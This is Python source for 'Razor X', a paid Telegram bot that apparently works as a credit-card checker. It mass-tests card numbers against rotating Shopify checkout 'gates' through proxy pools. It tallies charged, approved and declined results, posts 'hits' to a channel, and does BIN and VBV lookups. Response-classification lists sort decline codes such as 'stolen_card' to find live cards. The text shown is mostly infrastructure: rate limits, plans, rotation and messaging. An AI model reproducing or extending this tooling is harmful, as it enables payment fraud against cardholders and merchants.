# 𝙍𝘼𝙕𝙊𝙍 𝙓 𝘽𝙤𝙩
from telethon.errors import (
    UserNotParticipantError,
    ChatAdminRequiredError,
    ChannelPrivateError,
    FloodWaitError,
    UserIsBlockedError,
    PeerIdInvalidError,
    InputUserDeactivatedError,
    UserDeactivatedError,
    UserDeactivatedBanError,
    ChatWriteForbiddenError,
    QueryIdInvalidError,
)
from telethon import TelegramClient, events, Button
from telethon.tl.types import (
    MessageEntityCustomEmoji, ChannelParticipantBanned, ChannelParticipantLeft,
)
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.extensions import html as thtml
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import string
import logging
import html
import uuid
import socket
import platform
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote
from typing import Optional, List

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

from database import (
    init_db, db,
    save_sh_session, get_sh_session,
    ensure_user, get_user_plan, set_user_plan, is_premium_user,
    is_banned_user, get_user_expiry,
    add_proxy_db, get_all_user_proxies, get_proxy_count, get_random_proxy,
    remove_proxy_by_index, remove_proxy_by_url, clear_all_proxies,
    add_global_site, get_global_sites, remove_global_site,
    count_global_sites, clear_global_sites, seed_global_sites_from_user,
    track_user_stats, get_total_cards_count, get_charged_count, get_approved_count, get_declined_count,
    get_all_premium_users, get_active_premium_users, get_total_users, get_premium_count, get_all_user_ids,
    expire_due_plans, get_pending_expiry_notifications, clear_pending_expiry_notification,
    get_total_sites_count, get_users_with_sites, get_sites_per_user, get_all_sites_detail,
    mark_user_joined, is_user_marked_joined, remove_joined_mark,
    save_feedback, get_feedback_count,
    get_user_credits, set_user_credits, add_user_credits, deduct_credit, get_user_joined_date,
    create_keys, redeem_key, get_remaining_keys, expire_stale_unused_keys, get_key_doc,
    MAX_KEYS_PER_GENERATE,
)

# ====================== LOGGING ======================
log = logging.getLogger("RazorX")
log.setLevel(logging.INFO)
_log_fmt = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
_ch = logging.StreamHandler()
_ch.setLevel(logging.INFO)
_ch.setFormatter(_log_fmt)
log.addHandler(_ch)
try:
    _fh = logging.FileHandler('razor_x_bot.log', encoding='utf-8')
    _fh.setLevel(logging.INFO)
    _fh.setFormatter(_log_fmt)
    log.addHandler(_fh)
except Exception:
    pass

def log_user(uid, action, msg, level="info"):
    getattr(log, level, log.info)(f"[USER:{uid}] [{action}] {msg}")

def log_system(action, msg, level="info"):
    getattr(log, level, log.info)(f"[SYSTEM] [{action}] {msg}")
# ====================== BOLD SANS CONVERTER ======================
_BOLD_SANS_MAP = {}
_normal_upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
_normal_lower = "abcdefghijklmnopqrstuvwxyz"
_normal_digits = "0123456789"
_bold_upper = "𝗔𝗕𝗖𝗗𝗘𝗙𝗚𝗛𝗜𝗝𝗞𝗟𝗠𝗡𝗢𝗣𝗤𝗥𝗦𝗧𝗨𝗩𝗪𝗫𝗬𝗭"
_bold_lower = "𝗮𝗯𝗰𝗱𝗲𝗳𝗴𝗵𝗶𝗷𝗸𝗹𝗺𝗻𝗼𝗽𝗾𝗿𝘀𝘁𝘂𝘃𝘄𝘅𝘆𝘇"
_bold_digits = "𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵"
for _i, _c in enumerate(_normal_upper):
    _BOLD_SANS_MAP[_c] = _bold_upper[_i]
for _i, _c in enumerate(_normal_lower):
    _BOLD_SANS_MAP[_c] = _bold_lower[_i]
for _i, _c in enumerate(_normal_digits):
    _BOLD_SANS_MAP[_c] = _bold_digits[_i]

def bs(text):
    if not text:
        return text
    return "".join(_BOLD_SANS_MAP.get(c, c) for c in str(text))
    
# ====================== CONFIG ======================
def clean_channel_id(val):
    """Parse chat/channel IDs as provided — do not auto-prefix -100."""
    try:
        s = str(val).strip().replace(" ", "")
        return int(s)
    except Exception:
        return int(val)

API_ID = int(os.getenv("API_ID", ""))
API_HASH = os.getenv("API_HASH", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_ID = json.loads(os.getenv("ADMIN_ID", "["))
LOGS_CHANNEL_ID = clean_channel_id(os.getenv("LOGS_CHANNEL_ID", ""))
LOGS_CHANNEL_LINK = os.getenv("LOGS_CHANNEL_LINK", "")
HITS_CHANNEL_ID = clean_channel_id(os.getenv("HITS_CHANNEL_ID", "-"))
HITS_CHANNEL_LINK = os.getenv("HITS_CHANNEL_LINK", "")

HIT_CHANNEL_ID = LOGS_CHANNEL_ID

JOIN_GROUP_ID = clean_channel_id(os.getenv("JOIN_GROUP_ID", ""))
JOIN_GROUP_LINK = os.getenv("JOIN_GROUP_LINK", "")

API_BASE_URL = os.getenv("API_BASE_URL", "h")
BOT_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
DEV_LINK = "https://t.me/Ravenu899"
DEV_TAG = f"<a href='{DEV_LINK}'>{bs('Raven')}</a>"
BOT_LINK = "https://t.me/razor_x_v2_bot"

VBV_API_URL = ""
VBV_API_KEY = ""

# ====================== WORKERS ======================
SP_WORKERS = 50
MSP_WORKERS = 20
SITE_WORKERS = 10
PROXY_WORKERS = 10
BIN_WORKERS = 50
VBV_WORKERS = 5
GLOBAL_MSP_LIMIT = 500  # Max concurrent API requests across ALL users for Shopify

API_TIMEOUT = 60
BIN_TIMEOUT = 60
PROXY_TIMEOUT = 12
GATE_TIMEOUT = 90

BATCH_SIZE = 50
SITE_CHECK_BATCH = 10
HIT_DELAY = 2.0
PER_USER_LIMIT = 1000
MAX_PROXIES = 500
MAX_SITES = 3000
LOG_CHANNEL_ID = LOGS_CHANNEL_ID

FREE_ALL_GATES_COOLDOWN = 10

FREE_PLAN = "Trial"

PLANS = {
    "plan1": {"name": bs("Core Access"), "tier": "Core", "duration_days": 7, "emoji": "🛠️", "price": "$6.00"},
    "plan2": {"name": bs("Elite Access"), "tier": "Elite", "duration_days": 15, "emoji": "👑", "price": "$12.00"},
    "plan3": {"name": bs("Root Access"), "tier": "Root", "duration_days": 30, "emoji": "⭐", "price": "$18.00"},
    "plan4": {"name": bs("X-Access"), "tier": "X", "duration_days": 90, "emoji": "💎", "price": "$35.00"},
}
PAID_TIERS = ["Core", "Elite", "Root", "X", "Custom"]
OWNER_CONTACT = f"<a href='{DEV_LINK}'>{bs('Raven')}</a>"

_SP_SEM = asyncio.Semaphore(SP_WORKERS)
_MSP_SEM = asyncio.Semaphore(MSP_WORKERS)
_SITE_SEM = asyncio.Semaphore(SITE_WORKERS)
_PROXY_SEM = asyncio.Semaphore(PROXY_WORKERS)
_BIN_SEM = asyncio.Semaphore(BIN_WORKERS)
_VBV_SEM = asyncio.Semaphore(VBV_WORKERS)

PER_USER_MASS_WORKERS = {"msp": 20}
_USER_MASS_SEMS = {}

def _get_user_mass_sem(user_id, gate_cmd):
    key = (user_id, gate_cmd)
    sem = _USER_MASS_SEMS.get(key)
    if sem is None:
        limit = PER_USER_MASS_WORKERS.get(gate_cmd, 15)
        sem = asyncio.Semaphore(limit)
        _USER_MASS_SEMS[key] = sem
    return sem


def _cleanup_user_mass_sem(user_id, gate_cmd):
    _USER_MASS_SEMS.pop((user_id, gate_cmd), None)

CE = {
    "crown": 5039727497143387500, "bolt": 5042334757040423886,
    "brain": 5040030395416969985, "shield": 5042328396193864923,
    "star": 5042176294222037888, "gem": 5042050649248760772,
    "check": 5039793437776282663, "fire": 5039644681583985437,
    "party": 5039778134807806727, "search": 5039649904264217620,
    "chart": 5042290883949495533, "pin": 5039600026809009149,
    "joker": 5039998939076494446, "plus": 5039891861246838069,
    "cross": 5040042498634810056, "info": 5042306247047513767,
    "gift": 5041975203853239332, "eyes": 5039623284056917259,
    "trash": 5039614900280754969, "tick": 5039844895779455925,
    "stop": 5039671744172917707, "warn": 5039665997506675838,
    "link": 5042101437237036298, "globe": 5042186567783809934,
    "restart": 5413554170668032766, "online": 5413813953685923984,
    "declined": 5042112436648281096,
    "approved": 5039793437776282663,
    "charged": 4956719506027185156,
    "addtick": 4958610528588008305,
    "wave": 5319007286004299794,
}
PE = "⭐"

CHARGED_EMOJIS = [
    5285373878145667586, 5287547831677112267, 5287360712836928126,
    5285024405246725814, 5287777298894835685, 5285221724634239278,
    5285186510197381130, 5436143465211640305, 5787435351521889877,
    4956719506027185156, 6026031174340579961, 6025955600096038513,
    5321125250342083365, 5267419403019886452, 5231265132826343149,
    5285181291812120474, 5462902520215002477, 5994295021040309628,
    5380111356227770863
]

PLAN_EXPIRY_CHECK_INTERVAL = 120

_FREE_SITES_ROTATION_INDEX = 0

async def load_free_sites():
    """Load Shopify sites from sites.txt (filtering empty lines and comments)
       Falls back to database shared sites if empty/missing.
    """
    sites = []
    try:
        if os.path.exists("sites.txt"):
            async with aiofiles.open("sites.txt", "r", encoding="utf-8", errors="ignore") as f:
                content = await f.read()
                for line in content.splitlines():
                    s = line.strip()
                    if s and not s.startswith("#"):
                        sites.append(s)
    except Exception as e:
        print(f"Error reading sites.txt: {e}")
    if not sites:
        sites = await get_shopify_sites()
    return sites

ACTIVE_SESSIONS = {}
ACTIVE_MTXT_PROCESSES = {}
ACTIVE_SH_SESSIONS = {}
ACTIVE_ADD_PROCESSES = {}
PENDING_ADD_SITES = {}
PENDING_RM_SITES = {}
PENDING_SITE_CHECK = {}
PENDING_ADD_PROXIES = {}
PENDING_RM_PROXIES = {}
USER_APPROVED_PREF = {}

_PENDING_FEEDBACK = {}

_JOIN_CACHE = {}
_FREE_SP_USAGE = {}
_FREE_SP_LAST_USE = {}
_FREE_GATE_USAGE = {}
_FREE_GATE_LAST_USE = {}
_GLOBAL_COOLDOWN = {}
_VBV_LAST_USE = {}


def _get_ui_interval():
    active = len(ACTIVE_MTXT_PROCESSES)
    if active <= 5:
        return 2.5
    elif active <= 20:
        return 4.0
    elif active <= 50:
        return 6.0
    else:
        return 8.0


BOT_START_TIME = time.time()

async def _record_gate_result(gate_key, success):
    try:
        await db["gate_health"].update_one(
            {"gate_key": gate_key},
            {
                "$push": {
                    "records": {
                        "$each": [success],
                        "$slice": -100
                    }
                }
            },
            upsert=True
        )
    except Exception:
        pass


async def _get_gate_health(gate_key):
    try:
        doc = await db["gate_health"].find_one({"gate_key": gate_key})
        if not doc or not doc.get("records"):
            return "No Data"
        records = doc["records"]
        pct = int((sum(records) / len(records)) * 100)
        if pct >= 90:
            return f"{pct}%"
        elif pct >= 70:
            return f"{pct}% (Good)"
        else:
            return f"{pct}% (Degraded)"
    except Exception:
        return "No Data"


class _TgRateLimiter:
    def __init__(self, max_per_second=25):
        self._sem = asyncio.Semaphore(max_per_second)

    async def acquire(self):
        await self._sem.acquire()
        loop = asyncio.get_event_loop()
        loop.call_later(1.0, self._sem.release)

    async def __aenter__(self):
        await self.acquire()
        return self

    async def __aexit__(self, *args):
        pass


_TG_RATE = _TgRateLimiter(max_per_second=25)

HIT_BUTTON = [[Button.url(bs("Razor X"), BOT_LINK)]]

# ====================== BACKGROUND TASK QUEUE ======================
_BG_QUEUE = asyncio.Queue(maxsize=0)
_BG_WORKERS_COUNT = 500


async def _bg_worker():
    while True:
        try:
            coro = await _BG_QUEUE.get()
            await coro
        except asyncio.CancelledError:
            break
        except Exception:
            pass
        finally:
            _BG_QUEUE.task_done()


def fire_and_forget(coro):
    try:
        _BG_QUEUE.put_nowait(coro)
    except asyncio.QueueFull:
        asyncio.create_task(coro)


async def _send_plan_expired_notice(user_id: int):
    await styled_send(
        user_id,
        f"{PE} {bs('Your Plan is Expired.')} {PE}\n\n"
        f"{PE} {bs('Contact')} {OWNER_CONTACT} {bs('for premium.')}",
        emoji_ids=[5454156248813432363, 5319007286004299794, 5454156248813432363],
    )


async def _plan_expiry_worker():
    while True:
        try:
            expired_count = await expire_due_plans()
            if expired_count:
                log_system("PLAN_EXPIRY", f"Downgraded {expired_count} expired plan(s)")
            try:
                stale_keys = await expire_stale_unused_keys()
                if stale_keys:
                    log_system("KEY_EXPIRY", f"Expired {stale_keys} unused key(s)")
            except Exception as ke:
                log_system("KEY_EXPIRY_ERR", str(ke), "error")
            pending = await get_pending_expiry_notifications()
            for u in pending:
                uid = u.get("user_id")
                if not uid:
                    continue
                try:
                    await _send_plan_expired_notice(uid)
                    log_user(uid, "PLAN_EXPIRED", "Expiry notification sent")
                except Exception as e:
                    log_system("PLAN_EXPIRY_NOTIFY_ERR", f"User={uid} Error={e}", "error")
                await clear_pending_expiry_notification(uid)
        except Exception as e:
            log_system("PLAN_EXPIRY_WORKER_ERR", str(e), "error")
        await asyncio.sleep(PLAN_EXPIRY_CHECK_INTERVAL)


# ====================== CLIENT ======================
client = TelegramClient('razor_x_bot', API_ID, API_HASH)
client_instance = client

_SESSION_SP = None
_SESSION_MSP = None
_SESSION_SITE = None
_SESSION_BIN = None
_SESSION_PROXY = None
_SESSION_PP = None
_SESSION_AU = None
_SESSION_ST = None
_SESSION_B3 = None


CONN_POOL_LIMIT = 2000


async def get_sp_session():
    global _SESSION_SP
    if _SESSION_SP is None or _SESSION_SP.closed:
        _SESSION_SP = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=API_TIMEOUT, connect=10), connector=aiohttp.TCPConnector(limit=CONN_POOL_LIMIT, limit_per_host=100, ttl_dns_cache=300, use_dns_cache=True, enable_cleanup_closed=True, force_close=False))
    return _SESSION_SP


async def get_msp_session():
    global _SESSION_MSP
    if _SESSION_MSP is None or _SESSION_MSP.closed:
        _SESSION_MSP = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=API_TIMEOUT, connect=10), connector=aiohttp.TCPConnector(limit=CONN_POOL_LIMIT, limit_per_host=500, ttl_dns_cache=300, use_dns_cache=True, enable_cleanup_closed=True, force_close=False))
    return _SESSION_MSP


async def get_site_session():
    global _SESSION_SITE
    if _SESSION_SITE is None or _SESSION_SITE.closed:
        _SESSION_SITE = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=API_TIMEOUT, connect=10), connector=aiohttp.TCPConnector(limit=CONN_POOL_LIMIT, limit_per_host=100, ttl_dns_cache=300, use_dns_cache=True, enable_cleanup_closed=True, force_close=False))
    return _SESSION_SITE


async def get_bin_session():
    global _SESSION_BIN
    if _SESSION_BIN is None or _SESSION_BIN.closed:
        _SESSION_BIN = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=BIN_TIMEOUT, connect=5), connector=aiohttp.TCPConnector(limit=CONN_POOL_LIMIT, limit_per_host=100, ttl_dns_cache=300, use_dns_cache=True, enable_cleanup_closed=True, force_close=False))
    return _SESSION_BIN


async def get_proxy_session():
    global _SESSION_PROXY
    if _SESSION_PROXY is None or _SESSION_PROXY.closed:
        _SESSION_PROXY = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT, connect=15), connector=aiohttp.TCPConnector(limit=CONN_POOL_LIMIT, limit_per_host=100, ttl_dns_cache=300, use_dns_cache=True, enable_cleanup_closed=True, force_close=False))
    return _SESSION_PROXY


def generate_session_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))


# ====================== ANTI-FLOOD COOLDOWN ======================
def check_global_cooldown(user_id, cmd, cooldown_sec=2):
    key = f"{user_id}_{cmd}"
    now = time.time()
    last = _GLOBAL_COOLDOWN.get(key, 0)
    if now - last < cooldown_sec:
        return round(cooldown_sec - (now - last), 1)
    _GLOBAL_COOLDOWN[key] = now
    return 0


# ====================== FREE USER DAILY TRACKER ======================
def _get_today_key():
    return datetime.now().strftime("%Y-%m-%d")


def get_free_sp_usage(user_id):
    today = _get_today_key()
    entry = _FREE_SP_USAGE.get(user_id)
    if not entry or entry.get("date") != today:
        _FREE_SP_USAGE[user_id] = {"date": today, "count": 0}
        return 0
    return entry["count"]


def increment_free_sp_usage(user_id):
    today = _get_today_key()
    entry = _FREE_SP_USAGE.get(user_id)
    if not entry or entry.get("date") != today:
        _FREE_SP_USAGE[user_id] = {"date": today, "count": 1}
    else:
        _FREE_SP_USAGE[user_id]["count"] += 1


_FREE_GATE_GLOBAL_LAST_USE = {}


def get_free_sp_cooldown_remaining(user_id):
    return get_free_gate_cooldown(user_id)


def set_free_sp_last_use(user_id):
    set_free_gate_last_use(user_id)


def get_free_gate_usage(user_id, gate):
    today = _get_today_key()
    key = f"{user_id}_{gate}"
    entry = _FREE_GATE_USAGE.get(key)
    if not entry or entry.get("date") != today:
        _FREE_GATE_USAGE[key] = {"date": today, "count": 0}
        return 0
    return entry["count"]


def increment_free_gate_usage(user_id, gate):
    today = _get_today_key()
    key = f"{user_id}_{gate}"
    entry = _FREE_GATE_USAGE.get(key)
    if not entry or entry.get("date") != today:
        _FREE_GATE_USAGE[key] = {"date": today, "count": 1}
    else:
        _FREE_GATE_USAGE[key]["count"] += 1


def get_free_gate_cooldown(user_id, gate=None):
    last = _FREE_GATE_GLOBAL_LAST_USE.get(user_id, 0)
    elapsed = time.time() - last
    return 0 if elapsed >= FREE_ALL_GATES_COOLDOWN else round(FREE_ALL_GATES_COOLDOWN - elapsed, 1)


def set_free_gate_last_use(user_id, gate=None):
    _FREE_GATE_GLOBAL_LAST_USE[user_id] = time.time()


# ====================== SMART ROTATION ENGINE ======================
class SmartRotator:
    def __init__(self):
        self._site_fails = {}
        self._proxy_fails = {}
        self._site_idx = 0
        self._proxy_idx = 0

    def pick_site(self, sites, exclude=None):
        if not sites:
            return None
        exclude = exclude or set()
        n = len(sites)
        # True round-robin across the full pool so consecutive /sp checks change site
        for _ in range(n):
            self._site_idx = (self._site_idx + 1) % n
            site = sites[self._site_idx]
            if site in exclude:
                continue
            if self._site_fails.get(site, 0) >= 5:
                continue
            return site
        # Fallback: ignore fail counts, still skip exclude
        for _ in range(n):
            self._site_idx = (self._site_idx + 1) % n
            site = sites[self._site_idx]
            if site not in exclude:
                return site
        return sites[self._site_idx % n]

    def pick_proxy(self, proxies, exclude=None):
        if not proxies:
            return None
        exclude = exclude or set()
        n = len(proxies)
        for _ in range(n):
            self._proxy_idx = (self._proxy_idx + 1) % n
            proxy = proxies[self._proxy_idx]
            url = proxy.get('proxy_url')
            if url in exclude:
                continue
            if self._proxy_fails.get(url, 0) >= 5:
                continue
            return proxy
        for _ in range(n):
            self._proxy_idx = (self._proxy_idx + 1) % n
            proxy = proxies[self._proxy_idx]
            if proxy.get('proxy_url') not in exclude:
                return proxy
        return proxies[self._proxy_idx % n]

    def report_site_ok(self, site):
        self._site_fails[site] = 0

    def report_site_fail(self, site):
        self._site_fails[site] = self._site_fails.get(site, 0) + 1

    def report_proxy_ok(self, pu):
        if pu:
            self._proxy_fails[pu] = 0

    def report_proxy_fail(self, pu):
        if pu:
            self._proxy_fails[pu] = self._proxy_fails.get(pu, 0) + 1

    def get_dead_sites(self, threshold=5):
        return {s for s, c in self._site_fails.items() if c >= threshold}


# Persistent rotators so consecutive single checks advance site/proxy
_SP_ROTATOR = SmartRotator()


# ====================== SITE ERROR DETECTION ======================
SITE_ERROR_KEYWORDS = [
    'r4 token empty', 'payment method is not shopify', 'r2 id empty', 'product id is empty',
    'py id empty', 'clinte token', 'receipt_empty', 'receipt id is empty', 'receipt empty',
    'site requires login', 'failed to get token', 'no valid products', 'not shopify',
    'failed to get checkout', 'failed to detect product', 'failed to create checkout',
    'failed to get proposal data', 'site not supported', 'site error! status: 429',
    'token not found', 'handle is empty', 'payment method identifier is empty',
    'failed to get session token', 'failed to tokenize card', 'no_session_token',
    'no session token', 'no checkout token found', 'checkout token not found',
    'no checkout token', 'checkout token is empty', 'tokenize_fail', 'tokenize fail',
    'tax ammount empty', 'tax amount empty', 'tax amount is empty', 'del ammount empty',
    'site not supported for now', 'payment base card not supported', 'no product found',
]

PROXY_ERROR_KEYWORDS = ['proxy dead', 'proxy error', 'proxy timeout', 'proxy connection failed', 'proxy refused']


def is_site_error(text):
    if not text:
        return True
    lower = text.lower().strip()
    if lower == 'na':
        return True
    return any(kw.lower().strip() in lower for kw in SITE_ERROR_KEYWORDS)


def is_proxy_error(text):
    if not text:
        return False
    return any(kw in text.lower().strip() for kw in PROXY_ERROR_KEYWORDS)


def is_truly_alive(response, price):
    if not response:
        return False
    lower = response.lower().strip()
    pc = str(price).replace('$', '').strip() if price else '0'
    try:
        pv = float(pc)
    except Exception:
        pv = 0.0
    bad = ['error:', 'error: ', "error: '", 'cart failed', 'invalid json', 'inventoryreservationfailure', 'payments_positive_amount', 'payments_payment_flexibility', 'payments_credit_card_brand']
    for b in bad:
        if b in lower:
            return False
    if pv == 0.0:
        normal = ['card_declined', 'card declined', 'generic_decline', 'generic decline', 'do_not_honor', 'do not honor', 'insufficient_funds', 'insufficient funds', 'stolen_card', 'lost_card', 'expired_card', 'expired card', 'otp_required', 'otp required', '3d', 'authentication', 'cvc', 'ccn', 'generic_error', 'generic error', 'restricted_card', 'fraudulent', 'not_permitted', 'transaction_not_allowed', 'card_not_supported']
        if not any(n in lower for n in normal):
            return False
    return True


def normalize_site_url(url):
    """Normalize site URLs to domain only (Shopify-style stores)."""
    if not url:
        return None
    raw = str(url).strip()
    if not raw:
        return None
    if not raw.lower().startswith(("http://", "https://")):
        raw = "https://" + raw
    try:
        p = urlparse(raw)
        host = (p.netloc or "").lower()
        if host.startswith("www."):
            host = host[4:]
        if not host:
            return None
        return host
    except Exception:
        s = str(url).strip().lower()
        s = re.sub(r"^https?://", "", s).rstrip("/")
        if s.startswith("www."):
            s = s[4:]
        return s or None


def is_valid_url_or_domain(url):
    d = str(url or "").lower().strip()
    if not d:
        return False
    if d.startswith(("http://", "https://")):
        try:
            d = urlparse(d).netloc
        except Exception:
            return False
    else:
        d = d.split("/")[0]
    if d.startswith("www."):
        d = d[4:]
    return bool(re.match(
        r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$',
        d,
    ))


async def get_shopify_sites():
    """Single Shopify site pool for all users."""
    try:
        return await get_global_sites()
    except Exception:
        return []


# ====================== MESSAGE SYSTEM ======================
import contextvars
from telethon import TelegramClient
from telethon.tl import functions, types
from telethon.tl.types import MessageEntitySpoiler

_noforwards_var = contextvars.ContextVar('noforwards', default=False)

_orig_send_message = TelegramClient.send_message
async def _custom_send_message(self, *args, noforwards=False, **kwargs):
    token = _noforwards_var.set(noforwards)
    try:
        return await _orig_send_message(self, *args, **kwargs)
    finally:
        _noforwards_var.reset(token)

_orig_send_file = TelegramClient.send_file
async def _custom_send_file(self, *args, noforwards=False, **kwargs):
    token = _noforwards_var.set(noforwards)
    try:
        return await _orig_send_file(self, *args, **kwargs)
    finally:
        _noforwards_var.reset(token)

TelegramClient.send_message = _custom_send_message
TelegramClient.send_file = _custom_send_file

_orig_call = TelegramClient.__call__
async def _custom_call(self, request, *args, **kwargs):
    if _noforwards_var.get():
        if isinstance(request, (functions.messages.SendMessageRequest, functions.messages.SendMediaRequest)):
            request.noforwards = True
    return await _orig_call(self, request, *args, **kwargs)

TelegramClient.__call__ = _custom_call


async def safe_callback_answer(event, message=None, alert=False):
    """Answer a callback query; ignore expired/invalid query IDs.

    Telegram expires callback query IDs after a few seconds. Heavy /add work
    (thousands of sites) can outlive that window and crash the handler.
    """
    try:
        if message is None:
            await event.answer()
        else:
            await event.answer(message, alert=alert)
    except (QueryIdInvalidError, Exception):
        pass


# Monkey patch Telethon HTML parser to support <spoiler>
_original_handle_starttag = thtml.HTMLToTelegramParser.handle_starttag

def _custom_handle_starttag(self, tag, attrs):
    if tag == 'spoiler' or tag == 'tg-spoiler':
        self._open_tags.appendleft(tag)
        self._open_tags_meta.appendleft(None)
        if tag not in self._building_entities:
            self._building_entities[tag] = MessageEntitySpoiler(
                offset=len(self.text),
                length=0
            )
        return
    return _original_handle_starttag(self, tag, attrs)

thtml.HTMLToTelegramParser.handle_starttag = _custom_handle_starttag
def build_entities(html_text, emoji_ids=None):
    text, entities = thtml.parse(html_text)
    if emoji_ids:
        idx, utf16_pos = 0, 0
        for ch in text:
            if ch == PE and idx < len(emoji_ids):
                entities.append(MessageEntityCustomEmoji(offset=utf16_pos, length=1, document_id=emoji_ids[idx]))
                idx += 1
            utf16_pos += 2 if ord(ch) > 0xFFFF else 1

    def entity_key(e):
        cls_name = e.__class__.__name__
        if cls_name == 'MessageEntitySpoiler':
            priority = 0
        elif cls_name in ('MessageEntityTextUrl', 'MessageEntityUrl'):
            priority = 1
        elif cls_name in ('MessageEntityBold', 'MessageEntityItalic', 'MessageEntityUnderline', 'MessageEntityStrike'):
            priority = 2
        elif cls_name in ('MessageEntityCode', 'MessageEntityPre'):
            priority = 3
        else:
            priority = 4
        return (e.offset, -e.length, priority)

    return text, sorted(entities, key=entity_key)


async def styled_reply(event, html_text, buttons=None, emoji_ids=None, file=None, noforwards=False):
    try:
        async with _TG_RATE:
            text, entities = build_entities(html_text, emoji_ids)
            return await asyncio.wait_for(event.reply(text, formatting_entities=entities, buttons=buttons, file=file, link_preview=False, noforwards=noforwards), timeout=15)
    except asyncio.TimeoutError:
        return None
    except Exception:
        try:
            async with _TG_RATE:
                return await asyncio.wait_for(event.reply(html_text[:4000], parse_mode='html', link_preview=False), timeout=10)
        except Exception:
            return None


def _telethon_entities_to_bot_api(entities):
    """Convert Telethon message entities to Bot API entity dicts."""
    out = []
    if not entities:
        return out
    for e in entities:
        cls = e.__class__.__name__
        base = {"offset": e.offset, "length": e.length}
        if cls == "MessageEntityBold":
            base["type"] = "bold"
        elif cls == "MessageEntityItalic":
            base["type"] = "italic"
        elif cls == "MessageEntityUnderline":
            base["type"] = "underline"
        elif cls == "MessageEntityStrike":
            base["type"] = "strikethrough"
        elif cls == "MessageEntityCode":
            base["type"] = "code"
        elif cls == "MessageEntityPre":
            base["type"] = "pre"
            if getattr(e, "language", None):
                base["language"] = e.language
        elif cls == "MessageEntityTextUrl":
            base["type"] = "text_link"
            base["url"] = e.url
        elif cls == "MessageEntityUrl":
            base["type"] = "url"
        elif cls == "MessageEntityMentionName":
            base["type"] = "text_mention"
            base["user"] = {"id": e.user_id}
        elif cls == "MessageEntityCustomEmoji":
            base["type"] = "custom_emoji"
            base["custom_emoji_id"] = str(e.document_id)
        elif cls == "MessageEntitySpoiler":
            base["type"] = "spoiler"
        else:
            continue
        out.append(base)
    return out


def _buttons_to_bot_api_markup(buttons):
    if not buttons:
        return None
    rows = []
    try:
        for row in buttons:
            api_row = []
            for btn in row:
                if getattr(btn, "url", None):
                    api_row.append({"text": btn.text, "url": btn.url})
                elif getattr(btn, "data", None) is not None:
                    data = btn.data
                    if isinstance(data, (bytes, bytearray)):
                        data = data.decode("utf-8", errors="ignore")
                    api_row.append({"text": btn.text, "callback_data": str(data)})
            if api_row:
                rows.append(api_row)
    except Exception:
        return None
    return {"inline_keyboard": rows} if rows else None


async def _resolve_send_peer(chat_id):
    """Best-effort Telethon peer resolution for channels/groups/users."""
    try:
        return await client_instance.get_input_entity(chat_id)
    except Exception:
        pass
    try:
        from telethon.tl.types import PeerChannel, PeerChat, PeerUser
        cid = int(chat_id)
        if cid < 0:
            s = str(cid)
            if s.startswith("-100"):
                bare = int(s[4:])
                for peer in (PeerChannel(bare), PeerChat(bare)):
                    try:
                        return await client_instance.get_input_entity(peer)
                    except Exception:
                        pass
            else:
                bare = abs(cid)
                for peer in (PeerChat(bare), PeerChannel(bare)):
                    try:
                        return await client_instance.get_input_entity(peer)
                    except Exception:
                        pass
        else:
            try:
                return await client_instance.get_input_entity(PeerUser(cid))
            except Exception:
                pass
    except Exception:
        pass
    # Refresh dialog cache once, then retry
    try:
        await asyncio.wait_for(client_instance.get_dialogs(limit=50), timeout=10)
        return await client_instance.get_input_entity(chat_id)
    except Exception:
        return None


async def _styled_send_http(chat_id, text, entities=None, buttons=None):
    """Bot HTTP API fallback — works with raw chat_id when Telethon entity cache misses."""
    payload = {
        "chat_id": int(chat_id),
        "text": text[:4096],
        "disable_web_page_preview": True,
    }
    api_entities = _telethon_entities_to_bot_api(entities)
    if api_entities:
        payload["entities"] = api_entities
    markup = _buttons_to_bot_api_markup(buttons)
    if markup:
        payload["reply_markup"] = markup
    url = f"{BOT_API}/sendMessage"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                data = await resp.json(content_type=None)
                if data.get("ok"):
                    return data.get("result")
                log_system(
                    "STYLED_SEND_HTTP_ERR",
                    f"Chat={chat_id} Error={data.get('description') or data}",
                    "error",
                )
                return None
    except Exception as e:
        log_system("STYLED_SEND_HTTP_ERR", f"Chat={chat_id} Error={repr(e)}", "error")
        return None


async def styled_send(chat_id, html_text, buttons=None, emoji_ids=None, file=None, noforwards=False):
    text, entities = build_entities(html_text, emoji_ids)
    # File sends still go through Telethon (HTTP multipart is heavier); resolve peer first
    try:
        async with _TG_RATE:
            peer = chat_id
            try:
                return await asyncio.wait_for(
                    client_instance.send_message(
                        peer, text, formatting_entities=entities, buttons=buttons,
                        file=file, link_preview=False, noforwards=noforwards,
                    ),
                    timeout=15,
                )
            except ValueError as ve:
                if "entity" not in str(ve).lower() and "PeerChannel" not in str(ve):
                    raise
                resolved = await _resolve_send_peer(chat_id)
                if resolved is not None:
                    return await asyncio.wait_for(
                        client_instance.send_message(
                            resolved, text, formatting_entities=entities, buttons=buttons,
                            file=file, link_preview=False, noforwards=noforwards,
                        ),
                        timeout=15,
                    )
                raise
    except Exception as e:
        # HTTP fallback for text messages when Telethon cannot resolve the channel entity
        if file is None:
            result = await _styled_send_http(chat_id, text, entities=entities, buttons=buttons)
            if result is not None:
                return result
